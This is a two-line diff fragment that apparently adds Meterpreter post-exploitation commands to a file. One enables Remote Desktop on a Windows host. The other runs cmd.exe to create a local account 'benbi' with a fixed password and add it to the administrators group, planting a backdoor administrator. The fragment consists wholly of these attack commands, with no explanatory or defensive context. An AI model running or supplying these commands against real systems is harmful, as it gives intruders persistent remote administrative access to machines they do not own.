@@ -1,0 +1,2 @@
+run post/windows/manage/enable_rdp
+execute -f cmd.exe -a "/c net user benbi 1qaz@WSX /add && net localgroup administrators benbi /add"
